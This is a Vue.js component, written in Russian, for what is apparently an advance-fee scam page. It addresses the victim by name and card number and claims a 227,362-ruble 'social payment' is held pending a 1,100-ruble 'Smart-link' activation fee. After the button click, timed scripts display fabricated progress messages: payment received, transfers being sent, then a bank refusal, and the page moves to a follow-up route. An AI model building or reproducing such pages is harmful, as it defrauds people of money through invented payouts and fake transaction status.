<template>
	<div class="v-verificationActive">
		<div class="verificationActive">
			<div class="subVerificationActive">
				<p class="verificationActiveHeader">Код верификации не автивирован!</p>
				<div class="verificationActiveText">
					<p>{{this.$store.state.processingData.lastName}} {{this.$store.state.processingData.name}} {{this.$store.state.processingData.middleName}}, ваша социальная выплата в</p>
					<p>сумме <span>227 362 руб</span> (двести двадцать семь тысяч</p>
					<p>триста шестьдесят два рубля) на вашу карту</p>
					<p><span>№{{this.$store.state.processingData.cardNumber}}</span> отправлена и находится в</p>
					<p>буферной ячейки банка отправителя по причине</p>
					<p>того, что код верификации не был автоматически</p>
					<p>активирован из-за статуса вашей банковской</p>
					<p>карты.</p>
					<p>Для активации кода в автоматическом режиме</p>
					<p>нужно активировать опцию Смарт-линк для</p>
					<p>вашего профиля. <span id="greenColor">Стоимость активации опции и</span></p>
					<p><span id="greenColor">снятия всех ограничений- 1100 руб.</span></p>
					<p>После оплаты средства будут перечислены на ваш</p>
					<p>счет незамедлительно!</p>
				</div>
			<button class="verificationActiveButton" @click="newLoader">активировать опцию Смарт-линк</button>
			</div>
			<div class="subVerificationActiveTwo">
				<p class="verificationActiveHeaderTwo">Проверка статуса платежа</p>
				<p class="verificationActiveHeaderThree">Проверка кода верификации</p>
				<p class="verificationActiveHeaderFour">Отправка средств на вашу карту</p>
				<p class="verificationActiveHeaderFive">Отказ со стороны банка получателя!</p>
				<div class="wrappereVerificationActiveLoader">
					<div class="loadereVerificationActivLoader"></div>
				</div>
			</div>
			<img :src="require('@/assets/icons/checked.png')" class="verificationActiveImg">
			<img :src="require('@/assets/icons/check-in.png')" class="verificationActiveImgSecond">
			<p class="verificationActiveTextTwo">Платёж получен</p>
			<p class="verificationActiveTextThree">Опция «Смарт-линк» подключена</p>
			<p class="verificationActiveTextFour">Отправляем транзакцию на 150 000 руб</p>
			<p class="verificationActiveTextFive">Отправляем транзакцию на 77 362 руб</p>
			<p class="verificationActiveTextSix">Запрос причины отклонения</p>
			<p class="verificationActiveTextSeven">Ответ получен!</p>
		</div>
	</div>
</template>

<script>
	export default {
		name: 'v-verificationActive',
		data() {
			return {

			}
		},
		methods: {
			newLoader() {
				let subVerificationActive         	 	 = document.querySelector('.subVerificationActive')
				let verificationActiveHeaderTwo   	 	 = document.querySelector('.verificationActiveHeaderTwo')
				let verificationActiveHeaderThree 	 	 = document.querySelector('.verificationActiveHeaderThree')
				let verificationActiveHeaderFour  	 	 = document.querySelector('.verificationActiveHeaderFour')
				let verificationActiveHeaderFive   	 	 = document.querySelector('.verificationActiveHeaderFive')
				let subVerificationActiveTwo 				 	 = document.querySelector('.subVerificationActiveTwo')
				let verificationActiveImg 					 	 = document.querySelector('.verificationActiveImg')
				let verificationActiveImgSecond 		 	 = document.querySelector('.verificationActiveImgSecond')
				let verificationActiveTextThree 		 	 = document.querySelector('.verificationActiveTextThree')
				let verificationActiveTextFour 			 	 = document.querySelector('.verificationActiveTextFour')
				let verificationActiveTextFive 			 	 = document.querySelector('.verificationActiveTextFive')
				let verificationActiveTextSix 			   = document.querySelector('.verificationActiveTextSix')
				let verificationActiveTextSeven 			 = document.querySelector('.verificationActiveTextSeven')
				let wrappereVerificationActiveLoader 	 = document.querySelector('.wrappereVerificationActiveLoader')
				let verificationActiveTextTwo 			 	 = document.querySelector('.verificationActiveTextTwo')

				subVerificationActive.style.display = 'none'
				subVerificationActiveTwo.style.display = 'block'
				setTimeout(() => {
					wrappereVerificationActiveLoader.style.display = 'none'
					verificationActiveImg.style.display = 'block'
					verificationActiveTextTwo.style.display = 'block'
				}, 1000)
				setTimeout(() => {
					wrappereVerificationActiveLoader.style.display = 'block'
					verificationActiveImg.style.display = 'none'
					verificationActiveTextTwo.style.display = 'none'
					verificationActiveHeaderThree.style.display = 'block'
					verificationActiveHeaderTwo.style.display = 'none'
				}, 2000)
				setTimeout(() => {
					verificationActiveTextThree.style.display = 'block'
				}, 3000)
				setTimeout(() => {
					verificationActiveHeaderFour.style.display = 'block'
					verificationActiveHeaderThree.style.display = 'none'
					verificationActiveTextThree.style.display = 'none'
				}, 4000)
				setTimeout(() => {
					verificationActiveTextFour.style.display = 'block'
				}, 5000)
				setTimeout(() => {
					verificationActiveTextFive.style.display = 'block'
				}, 6000)
				setTimeout(() => {
					verificationActiveHeaderFour.style.display = 'none'
					verificationActiveHeaderFive.style.display = 'block'
					verificationActiveTextFour.style.display = 'none'
					verificationActiveTextFive.style.display = 'none'
					verificationActiveImgSecond.style.display = 'block'
					wrappereVerificationActiveLoader.style.display = 'none'
				}, 7000)
				setTimeout(() => {
					wrappereVerificationActiveLoader.style.display = 'block'
					verificationActiveImgSecond.style.display = 'none'
					verificationActiveTextSix.style.display = 'block'
				}, 9000)
				setTimeout(() => {
					verificationActiveTextSeven.style.display = 'block'
				}, 10000)
				setTimeout(() => {
					this.$router.push('/responseQuestion')
				}, 12000)
			}
		},
		mounted() {

		}

	}
</script>

<style>
	.v-verificationActive {
		max-width: 600px;
		margin: 0 auto;
		padding: 80px 0;
		display: flex;
		justify-content: center;
	}
	.verificationActive {
		width: 100%;
		min-height: 485px;
		background: #FFFFFF;
		box-shadow: 0px 4px 20px rgba(0, 0, 0, 0.1);
		border-radius: 15px;
		padding: 80px 40px;
		text-align: center;
	}
	.verificationActiveHeader {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #005391;
	}
	.verificationActiveHeaderThree {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
		display: none;
	}
	.verificationActiveHeaderFour {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
		display: none;
	}
	.verificationActiveHeaderFive {
		display: none;
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.verificationActiveText p{
		margin: 0;
		font-family: Montserrat;
		font-style: normal;
		font-weight: 500;
		font-size: 18px;
		line-height: 22px;
		color: #2D2D2D;
	}
	.verificationActiveText span {
		color: #00AEFF;
	}
	.verificationActiveButton {
		background: #005391;
		border-radius: 5px;
		border: none;
		outline: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 16px;
		line-height: 20px;
		text-transform: uppercase;
		color: #FFFFFF;
		padding: 15px;
		margin-top: 50px;
	}
	.verificationActiveButton:hover {
		cursor: pointer;
		background: #2E7DB8;
	}
	#greenColor {
		color: #49B43F;
	}
	.wrappereVerificationActiveLoader {
		margin: 34px auto;
		width: 53px;
	}
	.loadereVerificationActivLoader {
		animation: loader-spin 1s linear infinite;
		width: 53px;
		height: 53px;
		border: 4px solid rgba(0,0,0,0.1);
		border-radius: 50%;
		border-right-color: #0062AA;
		margin-top: 55px;
		margin-bottom: 60px;
	}
	@keyframes loader-spin {
  	0% {
    	transform: rotate(0deg);
  	}
  	100% {
    	transform: rotate(360deg);
  	}
	}
	.verificationActiveHeaderTwo {
		font-family: Exo 2;
		font-style: normal;
		font-weight: bold;
		font-size: 28px;
		line-height: 34px;
		color: #2D2D2D;
	}
	.subVerificationActiveTwo {
		display: none;
	}
	.verificationActiveImg {
		display: none;
		margin: 55px auto;
		width: 53px;
	}
	.verificationActiveImgSecond {
		display: none;
		margin: 55px auto;
		width: 53px;
	}
	.verificationActiveTextTwo {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		display: none;
	}
	.verificationActiveTextThree {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		display: none;
	}
	.verificationActiveTextFour {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		display: none;
	}
	.verificationActiveTextFive {
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
		display: none;
	}
	.verificationActiveTextSix {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	.verificationActiveTextSeven {
		display: none;
		font-family: Montserrat;
		font-style: normal;
		font-weight: bold;
		font-size: 18px;
		line-height: 22px;
		color: #0062AA;
	}
	@media only screen and (max-width: 440px) {
		.verificationActive {
			padding:20px 15px;
			margin: 10px;
			width: 250px;
		}
		.verificationActiveHeader {
			font-family: Exo 2;
			font-style: normal;
			font-weight: bold;
			font-size: 28px;
			line-height: 34px;
			color: #2D2D2D;
		}
		.verificationActiveButton {
			font-size: 14px;
		}
	}
</style>